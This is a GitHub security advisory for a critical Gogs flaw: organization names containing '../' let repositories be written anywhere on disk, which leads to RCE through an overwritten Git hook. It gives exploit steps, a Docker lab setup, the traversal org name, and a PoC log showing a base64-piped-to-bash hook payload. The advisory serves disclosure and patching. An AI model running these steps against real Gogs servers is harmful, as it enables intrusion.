# [C] Gogs has Path Traversal in organization name that results in RCE through Git hooks

## Summary
Severity: Critical
Advisory: GHSA-c39w-43gm-34h5
CVE: CVE-2026-52813
CWE: CWE-23
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-c39w-43gm-34h5
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
### Summary

Organization names containing path traversal sequences (`../`) are accepted by Gogs, and repositories under them are written to paths following these path traversals. This allows storing/retrieving data for repositories at arbitrary locations on the filesystem.
By creating nested structure of Git repositories, one can overwrite the other's `hooks` configuration to result in Remote Code Execution (RCE).

### Details

During organization creation, `internal/database/org.go` calls `os.MkdirAll(repox.UserPath(org.Name))` without sanitizing `org.Name`. 

https://github.com/gogs/gogs/blob/d7571322a04a29476d4241406ed50bf7eef0a5b7/internal/database/org.go#L165

Repository creation uses this name to decide where to write the Git bare repository's (`org/name.git`). By setting the org name to `../../../../tmp/test`, and creating a repository under that organization, it gets written under `/tmp/test` on the server.

https://github.com/gogs/gogs/blob/d7571322a04a29476d4241406ed50bf7eef0a5b7/internal/repox/repox.go#L57-L58

An attacker can abuse this in a clever way by writing to the `/data/gogs/data/tmp/local-r/1` directory, being a local worktree of the git repositories inside of Gogs. These directories are editable by Git. By creating a repository nested inside of there, files like `config` and `hooks/update` are now referenced through the path traversal, and are editable by Git. This allows the attacker to edit the `hooks/update` script with malicious Bash commands and then to trigger the hook.

The steps to exploit this inside of Gogs are roughly (ignoring some syncing dummy actions):

1. Create regular outer repository and get its ID
2. Create organization named `../../../../data/gogs/data/tmp/local-r/{ID}/nested`
3. Create a repository inside this organization (eg. `rce`), which will be written into the local clone of the outer repository
4. From the outer repository, edit `nested/rce.git/hooks/update` to contain malicious shell commands
5. Interact with the `rce` repository again to trigger the updated hook, and RCE is achieved

### PoC

1. Set up a default Gogs instance by saving the following content to `docker-compose.yml` and running `docker compose up`:

```yml
services:
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: gogs
      POSTGRES_PASSWORD: gogs
      POSTGRES_DB: gogs
    volumes:
      - postgres-data:/var/lib/postgresql/data
    restart: unless-stopped
    healthcheck:
      test: [ "CMD-SHELL", "pg_isready -U gogs -d gogs" ]
      interval: 5s
      timeout: 5s
      retries: 5

  gogs:
    image: gogs/gogs
    depends_on:
      db:
        condition: service_healthy
    ports:
      - "3000:3000"
    volumes:
      - gogs-data:/data
    restart: unless-stopped

volumes:
  gogs-data:
  postgres-data:
```

2. Visit http://localhost:3000, set the *Host* to `db:5432` and *Password* to `gogs`. Under *Admin Account Settings* configure your admin account
3. As the attacker, register an account with username `attacker` and password `attacker` at http://localhost:3000/user/sign_up
4. As the attacker, run the following script (in gist to avoid cluttering this advisory):

https://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9

The output should look like:

```shell
$ python3 gogs-rce.py
step 1 token ok
step 2 create personal repo 201 full_name attacker/writer-bd426045
step 3 web editor new file on attacker / writer-bd426045
step 4 GET writer repo -> local-r 1
step 5 create org 201 local-r 1 username ../../../../data/gogs/data/tmp/local-r/1/nested
step 6 get org 200 username ../../../../data/gogs/data/tmp/local-r/1/nested
step 7 create repo 201 full_name ../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 html_url http://localhost:3000/../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 clone_url http://localhost:3000/../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7.git
step 8 get repo 200 owner.username ../../../../data/gogs/data/tmp/local-r/1/nested full_name ../../../../data/gogs/data/tmp/local-r/1/nested/rce-b175aca7 empty False
Cloning into '/tmp/poc-writer-fy4k5064'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Unpacking objects: 100% (6/6), 491 bytes | 491.00 KiB/s, done.
step 9 clone writer repo -> /tmp/poc-writer-fy4k5064
[master 3cf84b2] poc: nested/rce-b175aca7.git hook path
 1 file changed, 1 insertion(+)
 create mode 100755 nested/rce-b175aca7.git/hooks/update
step 10 write nested/rce-b175aca7.git/hooks/update with echo 'aWQ=' | base64 -d | bash > pwned
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 14 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (6/6), 1022 bytes | 1022.00 KiB/s, done.
Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
To http://localhost:3000/attacker/writer-bd426045.git
   b0b9886..3cf84b2  master -> master
step 11 push writer
step 12 API new file on attacker / writer-bd426045
step 13 API new file on org ../../../../data/gogs/data/tmp/local-r/1/nested / rce-b175aca7
step 14 API new file on attacker / writer-bd426045
step 15 GET raw pwned 200 http://localhost:3000/attacker/writer-bd426045/raw/master/nested/rce-b175aca7.git/pwned

=== COMMAND OUTPUT ===
uid=1000(git) gid=1000(git) groups=1000(git)
```

### Impact

In the default setting, users can self-register and then create their own organizations. From here they can perform this exploit to achieve RCE as the `git` user.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-c39w-43gm-34h5
- https://nvd.nist.gov/vuln/detail/CVE-2026-52813
- https://github.com/gogs/gogs/pull/8334
- https://github.com/gogs/gogs/commit/f6acd467305943aae8403cbac81f0118dd1235d7
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
